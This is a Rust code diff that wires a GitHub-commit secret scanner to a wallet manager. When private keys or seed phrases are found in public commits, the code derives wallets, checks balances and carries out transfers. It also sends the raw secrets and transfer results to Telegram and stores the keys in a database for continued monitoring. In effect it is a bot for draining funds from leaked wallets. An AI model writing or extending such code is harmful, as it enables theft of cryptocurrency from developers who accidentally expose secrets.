@@ -1,12 +1,16 @@
 use crate::config::Config;
 use crate::core::cache::CacheManager;
 use crate::core::queue::EventQueue;
+use crate::database::models::{MonitoredWalletDoc, ScanLogDoc};
+use crate::database::ops::DatabaseOps;
 use crate::models::github::{CommitDetail, GitHubEvent};
+use crate::models::scan::{CryptoSecret, FilePriority, SecretType};
 use crate::patterns::matcher::PatternMatcher;
-use crate::scanner::commits::CommitFetcher;
+use crate::scanner::commits::{CommitFetcher, CommitWithRepo};
 use crate::scanner::events::GitHubEventsPoller;
 use crate::scanner::files::{should_scan_file, get_file_priority};
-use crate::models::scan::FilePriority;
+use crate::telegram::alerts::TelegramAlerts;
+use crate::wallet::manager::WalletManager;
 use std::sync::Arc;
 use tracing::{info, warn};
 
@@ -14,19 +18,28 @@ pub struct ScanEngine {
     config: Arc<Config>,
     cache: Arc<CacheManager>,
     matcher: Arc<PatternMatcher>,
+    wallet_manager: Arc<WalletManager>,
+    telegram: Arc<TelegramAlerts>,
+    db_ops: Arc<DatabaseOps>,
     event_queue: Arc<EventQueue<GitHubEvent>>,
-    commit_queue: Arc<EventQueue<CommitDetail>>,
+    commit_queue: Arc<EventQueue<CommitWithRepo>>,
 }
 
 impl ScanEngine {
     pub fn new(
         config: Arc<Config>,
         cache: Arc<CacheManager>,
+        wallet_manager: Arc<WalletManager>,
+        telegram: Arc<TelegramAlerts>,
+        db_ops: Arc<DatabaseOps>,
     ) -> Arc<Self> {
         Arc::new(Self {
             config: config.clone(),
             cache,
             matcher: Arc::new(PatternMatcher::new()),
+            wallet_manager,
+            telegram,
+            db_ops,
             event_queue: EventQueue::new(50_000),
             commit_queue: EventQueue::new(50_000),
         })
@@ -68,10 +81,10 @@ impl ScanEngine {
         // Consumer 2: Scan commits (parallel)
         let engine = self.clone();
         let consumer2 = tokio::spawn(async move {
-            while let Ok(commit) = engine.commit_queue.receiver().recv_async().await {
+            while let Ok(commit_with_repo) = engine.commit_queue.receiver().recv_async().await {
                 let engine = engine.clone();
                 tokio::spawn(async move {
-                    engine.scan_commit(commit).await;
+                    engine.scan_commit(commit_with_repo).await;
                 });
             }
         });
@@ -94,16 +107,10 @@ impl ScanEngine {
     }
     
     // Scan commit for secrets
-    async fn scan_commit(&self, commit: CommitDetail) {
-        let repo_name = commit.html_url.as_ref()
-            .map(|url| {
-                url.replace("https://github.com/", "")
-                    .split("/commit/")
-                    .next()
-                    .unwrap_or("unknown")
-                    .to_string()
-            })
-            .unwrap_or_else(|| "unknown".to_string());
+    async fn scan_commit(&self, commit_with_repo: CommitWithRepo) {
+        let repo_name = commit_with_repo.repo_name;
+        let commit = commit_with_repo.commit;
+        let commit_sha = commit.sha.clone();
         
         let files = match &commit.files {
             Some(files) => files,
@@ -135,10 +142,10 @@ impl ScanEngine {
                             secret.secret_type, file.filename, repo_name
                         );
                         
-                        // Process secret (wallet operations)
+                        // Process secret immediately
                         self.process_secret(
                             repo_name.clone(),
-                            commit.sha.clone(),
+                            commit_sha.clone(),
                             file.filename.clone(),
                             secret,
                         ).await;
@@ -154,14 +161,124 @@ impl ScanEngine {
         repo_name: String,
         commit_sha: String,
         file_path: String,
-        secret: crate::models::scan::CryptoSecret,
+        secret: CryptoSecret,
     ) {
-        info!(
-            "🔐 Processing {} from {}",
-            secret.secret_type, file_path
-        );
+        info!("🔐 Processing {} from {}", secret.secret_type, file_path);
         
-        // Here wallet manager will be called
-        // This will be integrated in main.rs
+        match secret.secret_type {
+            SecretType::PrivateKey => {
+                // Process private key
+                match self.wallet_manager.process_private_key(&secret.value).await {
+                    Ok((wallet_info, transfer_result)) => {
+                        // Send secret found alert
+                        self.telegram.send_secret_found(
+                            &repo_name,
+                            &commit_sha,
+                            &file_path,
+                            "PrivateKey",
+                            &secret.value,
+                        ).await;
+                        
+                        // Send balance detected alert
+                        self.telegram.send_balance_detected(&wallet_info).await;
+                        
+                        // If transfer happened
+                        if let Some(transfer) = transfer_result {
+                            if transfer.success {
+                                self.telegram.send_transfer_success(&wallet_info, &transfer).await;
+                            } else {
+                                if let Some(error) = &transfer.error {
+                                    self.telegram.send_transfer_failed(&wallet_info, error).await;
+                                }
+                            }
+                        }
+                        
+                        // Save to database for monitoring
+                        let monitored = MonitoredWalletDoc::new(
+                            wallet_info.address.clone(),
+                            wallet_info.private_key.clone(),
+                            None,
+                            repo_name.clone(),
+                            commit_sha.clone(),
+                            file_path.clone(),
+                        );
+                        
+                        let _ = self.db_ops.save_monitored_wallet(monitored).await;
+                        
+                        // Save scan log
+                        let scan_log = ScanLogDoc::new(
+                            repo_name.clone(),
+                            commit_sha.clone(),
+                            file_path.clone(),
+                            "PrivateKey".to_string(),
+                            secret.value.clone(),
+                        );
+                        
+                        let _ = self.db_ops.save_scan_log(scan_log).await;
+                    }
+                    Err(e) => {
+                        warn!("Failed to process private key: {}", e);
+                    }
+                }
+            }
+            SecretType::SeedPhrase => {
+                // Process seed phrase
+                match self.wallet_manager.process_seed_phrase(&secret.value).await {
+                    Ok(results) => {
+                        // Send secret found alert
+                        self.telegram.send_secret_found(
+                            &repo_name,
+                            &commit_sha,
+                            &file_path,
+                            "SeedPhrase",
+                            &secret.value,
+                        ).await;
+                        
+                        // Process each derived wallet
+                        for (wallet_info, transfer_result) in results {
+                            // Send balance detected alert
+                            self.telegram.send_balance_detected(&wallet_info).await;
+                            
+                            // If transfer happened
+                            if let Some(transfer) = transfer_result {
+                                if transfer.success {
+                                    self.telegram.send_transfer_success(&wallet_info, &transfer).await;
+                                } else {
+                                    if let Some(error) = &transfer.error {
+                                        self.telegram.send_transfer_failed(&wallet_info, error).await;
+                                    }
+                                }
+                            }
+                            
+                            // Save to database
+                            let monitored = MonitoredWalletDoc::new(
+                                wallet_info.address.clone(),
+                                wallet_info.private_key.clone(),
+                                Some(secret.value.clone()),
+                                repo_name.clone(),
+                                commit_sha.clone(),
+                                file_path.clone(),
+                            );
+                            
+                            let _ = self.db_ops.save_monitored_wallet(monitored).await;
+                        }
+                        
+                        // Save scan log
+                        let scan_log = ScanLogDoc::new(
+                            repo_name.clone(),
+                            commit_sha.clone(),
+                            file_path.clone(),
+                            "SeedPhrase".to_string(),
+                            secret.value.clone(),
+                        );
+                        
+                        let _ = self.db_ops.save_scan_log(scan_log).await;
+                    }
+                    Err(e) => {
+                        warn!("Failed to process seed phrase: {}", e);
+                    }
+                }
+            }
+        }
     }
 }
